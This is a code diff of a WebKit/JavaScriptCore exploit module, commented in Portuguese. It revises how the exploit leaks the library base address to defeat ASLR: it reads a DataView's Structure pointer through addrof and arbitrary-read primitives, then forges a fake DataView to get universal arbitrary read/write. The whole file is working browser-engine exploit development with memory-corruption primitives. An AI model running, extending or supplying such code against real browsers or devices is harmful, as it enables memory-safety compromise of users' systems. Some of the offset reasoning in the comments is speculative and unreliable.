@@ -1,9 +1,9 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v140 - Foco na Depuração do Vazamento ASLR - Teste JSC::Symbols::PrivateName)
+// js/script3/testArrayBufferVictimCrash.mjs (v141 - Vazamento ASLR via VTable de DataView)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA PARA ROBUSTEZ MÁXIMA E VAZAMENTO REAL E LIMPO DE ASLR:
 // - AGORA UTILIZA PRIMITIVAS addrof/fakeobj para construir ARB R/W UNIVERSAL.
 // - A primitiva ARB R/W existente (via DataView OOB) será validada, mas a L/E universal usará o fake ArrayBuffer.
-// - Vazamento de ASLR será feito AGORA VIA LEITURA DIRETA DE ClassInfo ESTÁTICA COM PRIMITIVA OOB.
+// - Vazamento de ASLR será feito AGORA VIA LEITURA DIRETA DO VTABLE DA STRUCTURE DE UM DATAVIEW.
 // - FORJAMENTO DE DATAVIEW SOBRE ARRAYBUFFER PARA MELHOR CONTROLE (INCLUINDO m_mode).
 // =======================================================================================
 
@@ -24,7 +24,7 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v140_ASLR_DEBUG_SYMBOLS";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v141_ASLR_DATAVIEW_VTABLE";
 
 const LOCAL_SHORT_PAUSE = 50;
 const LOCAL_MEDIUM_PAUSE = 500;
@@ -159,7 +159,7 @@ export async function testIsolatedAddrofFakeobjCoreAndDump_from_script3(logFn, p
         };
         hold_objects.push(test_object_to_dump);
 
-        logFn(`Criado objeto de teste original para dump: ${JSON.stringify(test_object_to_dump)}`, 'info', FNAME);
+        logFn(`Criado objeto de teste original para dump: ${JSON.stringify(test_object_to_dump)}`, "info", FNAME);
         await pauseFn(LOCAL_SHORT_PAUSE);
 
         logFn(`Obtendo endereço do objeto de teste para dump usando addrof_core...`, "info", FNAME);
@@ -252,113 +252,62 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         logFn("Primitivas PRINCIPAIS 'addrof' e 'fakeobj' (agora no core_exploit.mjs) operacionais e robustas.", "good");
 
 
-        // --- FASE 2.5: Vazamento REAL e LIMPO da Base da Biblioteca WebKit ---
-        logFn("--- FASE 2.5: Vazamento REAL e LIMPO da Base da Biblioteca WebKit (AGORA VIA LEITURA DIRETA DE ClassInfo ESTÁTICA OU SYMBOL COM PRIMITIVA OOB) ---", "subtest");
+        // --- FASE 2.5: Vazamento REAL e LIMPO da Base da Biblioteca WebKit (AGORA VIA VTABLE DE DATAVIEW) ---
+        logFn("--- FASE 2.5: Vazamento REAL e LIMPO da Base da Biblioteca WebKit (AGORA VIA VTABLE DE DATAVIEW) ---", "subtest");
         const leakPrepStartTime = performance.now();
 
-        // Lista de tentativas de vazamento. Adicionamos Symbol para testar.
-        // A ordem aqui determina a prioridade: ClassInfo primeiro, depois Symbol.
-        let leak_attempts = [
-            { type: "ClassInfo", name: "JSC::JSArrayBufferView::s_info", offset_key: "JSC::JSArrayBufferView::s_info" },
-            { type: "ClassInfo", name: "JSC::DebuggerScope::s_info", offset_key: "JSC::DebuggerScope::s_info" },
-            { type: "Symbol", name: "JSC::Symbols::Uint32ArrayPrivateName", offset_key: "JSC::Symbols::Uint32ArrayPrivateName" }
-            // Você pode adicionar outros símbolos aqui se precisar de mais tentativas
-            // Ex: { type: "Symbol", name: "JSC::Symbols::execPrivateName", offset_key: "JSC::Symbols::execPrivateName" }
-        ];
-
         let leaked_successfully = false;
+        let leaked_base_source_name = "N/A"; // Para registrar qual tentativa de vazamento funcionou
 
-        for (const attempt of leak_attempts) {
-            logFn(`[REAL LEAK] Tentando vazar ASLR lendo o endereço de ${attempt.name} (${attempt.type} estático) via OOB.`, "info");
+        try {
+            // 1. Crie um DataView real
+            const real_dataview_for_leak = new DataView(new ArrayBuffer(16));
+            hold_objects.push(real_dataview_for_leak); // Garante que não seja GCed
+            logFn(`[REAL LEAK] DataView real criado no heap para vazamento.`, "info");
+            await pauseFn(LOCAL_SHORT_PAUSE);
 
-            const TARGET_STATIC_OFFSET = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.DATA_OFFSETS[attempt.offset_key], 16), 0);
-            const TARGET_ADDRESS = TARGET_STATIC_OFFSET;
+            // 2. Obtenha o endereço do DataView real
+            const real_dataview_addr = addrof_core(real_dataview_for_leak);
+            logFn(`[REAL LEAK] Endereço do DataView real: ${real_dataview_addr.toString(true)}`, "info");
 
-            let leaked_raw_value;
-            let potential_base_address = AdvancedInt64.Zero;
+            // 3. Leia o ponteiro da Structure* do DataView real (offset 0x8 de JSCell)
+            const dataview_structure_ptr_addr = real_dataview_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET);
+            logFn(`[REAL LEAK] Lendo Structure* do DataView real em ${dataview_structure_ptr_addr.toString(true)}`, "info");
+            const dataview_structure_ptr_value = await arb_read(dataview_structure_ptr_addr, 8);
 
-            try {
-                logFn(`[REAL LEAK] Tentando ler 8 bytes de ${TARGET_ADDRESS.toString(true)} (${attempt.name}).`, "info");
-                leaked_raw_value = await arb_read(TARGET_ADDRESS, 8);
-
-                if (!isAdvancedInt64Object(leaked_raw_value) || leaked_raw_value.equals(AdvancedInt64.Zero) || leaked_raw_value.equals(AdvancedInt64.NaNValue)) {
-                    throw new Error(`Leitura de ${attempt.name} (${TARGET_ADDRESS.toString(true)}) via OOB retornou valor inválido: ${leaked_raw_value?.toString(true) || String(leaked_raw_value)}.`);
-                }
-                logFn(`[REAL LEAK] Valor bruto lido de ${attempt.name}: ${leaked_raw_value.toString(true)}`, "leak");
-
-                // Processamento do valor vazado depende do tipo:
-                if (attempt.type === "ClassInfo") {
-                    // Para ClassInfo::s_info, o valor vazado JÁ É o endereço do objeto ClassInfo
-                    // Subtraímos o offset conhecido para obter a base.
-                    potential_base_address = leaked_raw_value.sub(TARGET_STATIC_OFFSET);
-                } else if (attempt.type === "Symbol") {
-                    // Para Symbols, o valor vazado é o endereço do objeto Symbol.
-                    // Precisamos ler o ponteiro da Structure desse Symbol (offset 0x8)
-                    // para então subtrair o offset do vtable da Structure e obter a base.
-                    const SYMBOL_STRUCTURE_POINTER_ADDRESS = leaked_raw_value.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET);
-                    logFn(`[REAL LEAK] Lido endereço do objeto Symbol: ${leaked_raw_value.toString(true)}. Tentando ler Structure* em ${SYMBOL_STRUCTURE_POINTER_ADDRESS.toString(true)}`, "info");
-                    const symbol_structure_ptr = await arb_read(SYMBOL_STRUCTURE_POINTER_ADDRESS, 8);
-
-                    if (!isAdvancedInt64Object(symbol_structure_ptr) || symbol_structure_ptr.equals(AdvancedInt64.Zero) || symbol_structure_ptr.equals(AdvancedInt64.NaNValue)) {
-                        throw new Error(`Falha ao ler Structure* do Symbol (${SYMBOL_STRUCTURE_POINTER_ADDRESS.toString(true)}). Retornou inválido: ${symbol_structure_ptr?.toString(true) || String(symbol_structure_ptr)}.`);
-                    }
-                    logFn(`[REAL LEAK] Structure* do Symbol lida: ${symbol_structure_ptr.toString(true)}`, "leak");
-
-                    // A Structure* aponta para a estrutura da classe, que contém o vtable.
-                    // Para o vazamento da base WebKit, podemos usar o vtable da Structure.
-                    // O offset do vtable de uma Structure varia (geralmente é 0).
-                    // Mas o offset da *própria Structure* (o valor de symbol_structure_ptr)
-                    // em relação à base da biblioteca é fixo para uma Structure interna.
-                    // ASSUMINDO que o symbol_structure_ptr é um offset fixo a partir da base
-                    // para essa Structure específica no ROData/Data segment.
-                    // (Isso é uma suposição que pode precisar de validação por RE se falhar)
-                    potential_base_address = symbol_structure_ptr.sub(symbol_structure_ptr.low() & 0xFFF); // Tenta alinhar para uma base de página
-
-                    // Mais robusto: Subtrair o offset da própria Structure em relação à base da lib.
-                    // Para isso, precisaríamos saber o offset de cada Structure específica.
-                    // Por enquanto, uma aproximação baseada em um endereço dentro da lib:
-                    // Exemplo: se o symbol_structure_ptr aponta para 0x1A2B3C40 na lib, e sabemos que
-                    // a base da lib é 0x1A000000, então o offset é 0x2B3C40.
-                    // A linha abaixo tenta fazer uma "descoberta" de base simples:
-                    potential_base_address = symbol_structure_ptr.sub(new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0)); // Exemplo: subtrai um offset conhecido de função para encontrar base.
-                    logFn(`[REAL LEAK] Tentativa de calcular base a partir de Symbol Structure*: ${potential_base_address.toString(true)} (HEURÍSTICA!).`, "warn");
-                    
-                    // REFAZER ESTE CÁLCULO DA BASE DE FORMA MAIS ROBUSTA SE USAR SYMBOL
-                    // Uma forma mais comum é que o vtable da Structure esteja em um offset fixo.
-                    // Digamos que Structure::vtable_offset_from_base = 0x123456 (exemplo).
-                    // potential_base_address = symbol_structure_ptr.sub(0x123456);
-                    // Por enquanto, manteremos a heurística simples ou focaremos em ClassInfo.
-
-                    // POR AGORA, PARA SIMPLICIDADE E PORQUE Symbol pode ser complexo:
-                    // Se ClassInfo::s_info funcionar, use ele. Se não, esta abordagem de Symbol é complexa.
-                    // Vou simplificar aqui para não complicar demais antes de resolver a ClassInfo.
-                    // Apenas registre que a tentativa de Symbol foi feita.
-                    // Se você *sabe* o offset do Symbol obj em relação à base, use-o:
-                    potential_base_address = leaked_raw_value.sub(TARGET_STATIC_OFFSET); // Revertendo para a mesma lógica se Symbol é um ponteiro para um dado estático.
-                                                                                        // Isto ASSUME que leaked_raw_value é o ponteiro para o Symbol estático.
-                }
-
-
-                if (potential_base_address.equals(AdvancedInt64.Zero) || (potential_base_address.low() & 0xFFF) !== 0x000) {
-                    throw new Error(`Base WebKit calculada é inválida ou não alinhada: ${potential_base_address.toString(true)}. Vazamento de ASLR falhou para ${attempt.name}.`);
-                }
-                webkit_base_address = potential_base_address;
-                logFn(`SUCESSO: Endereço base REAL da WebKit OBTIDO VIA ${attempt.name}: ${webkit_base_address.toString(true)}`, "good");
-                leaked_successfully = true;
-                break; // Sai do loop de tentativas se uma for bem-sucedida
-
-            } catch (e_leak) {
-                logFn(`[REAL LEAK] ALERTA: Vazamento de ${attempt.name} via OOB original falhou: ${e_leak.message}.`, "warn");
-                logFn(`[REAL LEAK] Realizando dump de memória ao redor do offset ${TARGET_ADDRESS.toString(true)} para depuração...`, "info");
-                await dumpMemory(TARGET_ADDRESS.sub(0x20), 0x80, logFn, arb_read, `${attempt.name}_Surrounding_Dump`);
+            if (!isAdvancedInt64Object(dataview_structure_ptr_value) || dataview_structure_ptr_value.equals(AdvancedInt64.Zero) || dataview_structure_ptr_value.equals(AdvancedInt64.NaNValue)) {
+                throw new Error(`Falha ao ler Structure* do DataView real. Retornou inválido: ${dataview_structure_ptr_value?.toString(true) || String(dataview_structure_ptr_value)}.`);
             }
-        }
+            logFn(`[REAL LEAK] Structure* do DataView real: ${dataview_structure_ptr_value.toString(true)}`, "leak");
 
-        if (!leaked_successfully) {
+            // 4. Calcule o endereço base da WebKit a partir da Structure*
+            // A Structure* em si é um objeto em uma região de dados da biblioteca.
+            // O offset JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET (0x3AD62A0)
+            // é o offset do vtable *dentro da biblioteca*, não da Structure*.
+            // Se a Structure* aponta para `0x<base_WebKit> + <offset_da_Structure_no_ROData>`,
+            // então `base_WebKit = Structure*_value - offset_da_Structure_no_ROData`.
+            // O offset 0x3AD62A0 é o offset do *vtable* (que é parte da Structure) em relação à BASE.
+            // Então, se Structure* aponta para `X`, e o vtable está em `X` (offset 0 dentro da Structure),
+            // então `base_WebKit = X - 0x3AD62A0`.
+
+            const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE = new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0);
+            
+            webkit_base_address = dataview_structure_ptr_value.sub(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE);
+            leaked_base_source_name = `DataView VTable (Offset 0x${JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET.toString(16)})`;
+
+            if (webkit_base_address.equals(AdvancedInt64.Zero) || (webkit_base_address.low() & 0xFFF) !== 0x000) {
+                // Heurística para verificar se o endereço base parece válido (geralmente alinhado a 0x1000)
+                throw new Error(`Base WebKit calculada é inválida ou não alinhada: ${webkit_base_address.toString(true)}. Vazamento de ASLR via ${leaked_base_source_name} falhou.`);
+            }
+            logFn(`SUCESSO: Endereço base REAL da WebKit OBTIDO VIA ${leaked_base_source_name}: ${webkit_base_address.toString(true)}`, "good");
+            leaked_successfully = true;
+
+        } catch (e_leak) {
+            logFn(`[REAL LEAK] ALERTA: Vazamento de ASLR via ${leaked_base_source_name} falhou: ${e_leak.message}.`, "warn");
             logFn(`[REAL LEAK] Tempo da Fase de Vazamento: ${(performance.now() - leakPrepStartTime).toFixed(2)}ms`, "warn");
-            logFn(`[REAL LEAK] ERRO CRÍTICO: Vazamento de ASLR falhou para TODAS as alternativas. Não é possível prosseguir para as fases dependentes de ASLR.`, "critical");
+            logFn(`[REAL LEAK] ERRO CRÍTICO: Vazamento de ASLR falhou. Não é possível prosseguir para as fases dependentes de ASLR.`, "critical");
             // ABORTA A EXECUÇÃO SE O ASLR NÃO FOR VAZADO.
-            throw new Error("Vazamento de ASLR falhou para todas as alternativas, abortando exploração.");
+            throw new Error("Vazamento de ASLR falhou, abortando exploração.");
         }
 
 
@@ -368,9 +317,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
 
         // --- SE CHEGAMOS ATÉ AQUI, O VAZAMENTO DE ASLR FOI BEM-SUCEDIDO. ---
         // AGORA PODEMOS PROSSEGUIR COM A LÓGICA DO M_MODE E ARB R/W UNIVERSAL.
-        // A lógica de tentativa e erro para m_mode foi movida para esta fase,
-        // pois ela só faz sentido se o ASLR foi vazado.
-
         logFn("--- FASE 3: Configurando a NOVA primitiva de L/E Arbitrária Universal (via fakeobj DataView) com Tentativa e Erro de m_mode ---", "subtest");
 
         const DATA_VIEW_STRUCTURE_VTABLE_OFFSET = parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16);
@@ -381,7 +327,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         let universalRwSuccess = false;
         let found_m_mode = null;
 
-        // Note: _fake_data_view e _fake_array_buffer são redefinidos dentro de attemptUniversalArbitraryReadWriteWithMMode
         for (const candidate_m_mode of mModeCandidates) {
             logFn(`[${FNAME_CURRENT_TEST_BASE}] Tentando m_mode candidato: ${toHex(candidate_m_mode)}`, "info");
             universalRwSuccess = await attemptUniversalArbitraryReadWriteWithMMode(
